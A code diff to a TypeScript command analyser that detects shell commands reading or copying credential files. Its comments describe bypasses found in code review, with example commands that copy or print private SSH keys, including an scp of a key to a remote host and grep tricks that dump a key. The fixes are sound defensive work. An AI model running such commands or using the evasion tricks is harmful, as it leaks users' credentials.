@@ -878,6 +878,49 @@ const PATTERN_VERBS: Record<string, PatternShape> = {
       '--vimgrep',
       '--with-filename',
       '--word-regexp',
+      // The COMPLETE remainder of `rg --help`, added after /code-review round 5
+      // found 40 documented switches in neither set. The table is now the whole
+      // option list: `rg --help` yields 149 long options, 35 of them value-taking.
+      '--ignore',
+      '--ignore-dot',
+      '--ignore-exclude',
+      '--ignore-files',
+      '--ignore-global',
+      '--ignore-messages',
+      '--ignore-parent',
+      '--ignore-vcs',
+      '--maxdepth',
+      '--messages',
+      '--no-auto-hybrid-regex',
+      '--no-binary',
+      '--no-block-buffered',
+      '--no-byte-offset',
+      '--no-crlf',
+      '--no-fixed-strings',
+      '--no-follow',
+      '--no-glob-case-insensitive',
+      '--no-heading',
+      '--no-hidden',
+      '--no-ignore-file-case-insensitive',
+      '--no-include-zero',
+      '--no-invert-match',
+      '--no-json',
+      '--no-line-buffered',
+      '--no-max-columns-preview',
+      '--no-mmap',
+      '--no-multiline',
+      '--no-multiline-dotall',
+      '--no-one-file-system',
+      '--no-pcre2',
+      '--no-search-zip',
+      '--no-sort-files',
+      '--no-stats',
+      '--no-text',
+      '--no-trim',
+      '--passthrough',
+      '--pcre2-unicode',
+      '--require-git',
+      '--unicode',
     ]),
     patternFlags: new Set(['-e', '--regexp']),
     // `--files` and `--type-list` list or enumerate without a pattern. Founder
@@ -2720,8 +2763,6 @@ function copySourcePaths(words: (string | null)[]): string[] {
   // are handled in archiveInputs, which reads nothing at all.
   const destIsLastOperand =
     (shape.source === 'allButLast' || shape.source === 'first') && !targetDir && !dynamicDest;
-  if (destIsLastOperand && typeof lastOperand === 'string' && matchSensitivePath(lastOperand))
-    return [];
 
   let src: PositionedArg[];
   switch (shape.source) {
@@ -2755,7 +2796,29 @@ function copySourcePaths(words: (string | null)[]): string[] {
       src = targetDir || dynamicDest ? args : args.slice(0, -1);
       break;
   }
-  return src.filter((a) => !skipped(a) && !targetOperand(a)).map((a) => a.value);
+  const sources = src.filter((a) => !skipped(a) && !targetOperand(a)).map((a) => a.value);
+
+  // A literal destination INSIDE the jail is not a copy OUT of it:
+  // `cp /tmp/ci_key ~/.ssh/id_rsa` installs a key and `mv ~/.ssh/id_rsa
+  // ~/.ssh/id_rsa.bak` renames one. Only for the shapes whose destination IS the
+  // last operand -- for an archiver the last operand is an INPUT (`tar czf
+  // out.tgz ~/.ssh`) and with `-t DIR` the destination sits in the flag.
+  //
+  // ⚠️ This guard used to suppress on the DESTINATION alone, which /code-review
+  // round 5 turned into a bypass: `cp ~/.ssh/id_rsa /tmp/.ssh/k` and
+  // `scp ~/.ssh/id_rsa user@host:/tmp/.ssh/` produced no finding at all, because
+  // `/tmp/.ssh/` matches the same rule the real jail does and the matcher cannot
+  // tell one from the other. The source decides now:
+  //   no jailed source              -> an install, stay quiet (unchanged)
+  //   jailed source, SAME directory -> a rename inside the jail, stay quiet
+  //   jailed source, elsewhere      -> the credential is LEAVING: review
+  if (destIsLastOperand && typeof lastOperand === 'string' && matchSensitivePath(lastOperand)) {
+    const jailedSources = sources.filter((p) => matchSensitivePath(p));
+    const dirOf = (p: string) => p.replace(/[\\/][^\\/]*$/, '');
+    if (jailedSources.length === 0) return [];
+    if (jailedSources.every((p) => dirOf(p) === dirOf(lastOperand))) return [];
+  }
+  return sources;
 }
 
 /**
@@ -3015,8 +3078,9 @@ function flagEffect(token: string, shape: PatternShape, known: Set<string>): Fla
  * Never excuses more than one word, and excuses by SLOT rather than by shape.
  * When the pattern arrived from anywhere but a positional slot -- a flag operand,
  * a bundle, an `=` token, a pattern FILE -- every positional is a file and
- * nothing is excused except that flag's own operand. When any flag in the
- * command is UNKNOWN to the table, nothing is excused at all.
+ * nothing is excused except that flag's own operand. When a flag BEFORE the
+ * pattern is UNKNOWN to the table, slots cannot be counted past it and nothing is
+ * excused; a flag after the pattern is irrelevant and does not suppress it.
  */
 function readTargets(
   verb: string,
@@ -3054,33 +3118,38 @@ function readTargets(
   // dynamic word, so once one appears ahead of a candidate we cannot say which
   // slot is the pattern, and we excuse nothing. A dynamic word AFTER the pattern
   // (`grep .env "$FILE"`) is harmless and still excuses.
-  const firstDynamic = words.findIndex((w, i) => i >= from && w === null);
-  // `--` ends the options, so the very next word is the PATTERN whatever it looks
-  // like, and everything after it is a FILE. `positionedArgs` does not honour it
-  // (a dash-looking word is a flag to it), so `grep -v -- -zzzz KEY` gave the
-  // credential slot 0 and excused it -- measured, the whole key printed
-  // (/code-review round 4). When that pattern word is dash-looking it is not in
-  // `args` at all, and then nothing is excused.
-  const endOfOptions = words.findIndex((w, i) => i >= from && w === '--');
-  if (!patternElsewhere && endOfOptions >= 0) {
-    const a = args.find((x) => x.argv === endOfOptions + 1);
-    if (a) excused.add(a);
-  } else if (!patternElsewhere) {
-    for (const a of args) {
-      if (firstDynamic >= 0 && a.argv > firstDynamic) break;
-      if (a.afterFlag === null) {
-        excused.add(a);
-        break;
+  // Which ARGV position holds the search pattern, resolved the way the tool's own
+  // parser resolves it, left to right. One walk covers every case, and replacing
+  // two special-cased branches with it closed the bypass /code-review round 5
+  // found: the `--` branch excused the word after `--` unconditionally, so
+  // `grep TODO -- ~/.ssh/id_rsa` -- pattern already given, `--` then naming a
+  // FILE -- excused the credential and printed the key.
+  //
+  //   a dynamic word   the pattern may BE it: unknowable, excuse nothing
+  //   `--`             options end, so the NEXT word is the pattern whatever it
+  //                    looks like (and may be dash-looking, hence absent from args)
+  //   a value flag     its operand follows: skip both
+  //   a no-value flag  keep looking
+  //   an UNKNOWN flag  we cannot count slots past it: excuse nothing
+  //   anything else    this is the pattern
+  const patternArgv = ((): number => {
+    for (let i = from; i < words.length; i++) {
+      const w = words[i];
+      if (w === null) return -1;
+      if (w === '--') return i + 1;
+      if (w.startsWith('-') && w !== '-') {
+        const e = flagEffect(w, shape, known);
+        if (e.kind === 'takes') i += 1;
+        else if (e.kind === 'unknown') return -1;
+        continue;
       }
-      const e = flagEffect(a.afterFlag, shape, known);
-      if (e.kind === 'none') {
-        excused.add(a);
-        break;
-      }
-      // 'takes': this word is the flag's value, so keep looking. 'unknown': we
-      // cannot tell which word is the pattern, so excuse nothing.
-      if (e.kind === 'unknown') break;
+      return i;
     }
+    return -1;
+  })();
+  if (!patternElsewhere && patternArgv >= 0) {
+    const a = args.find((x) => x.argv === patternArgv);
+    if (a) excused.add(a);
   }
   return args.filter((a) => !excused.has(a)).map((a) => a.value);
 }
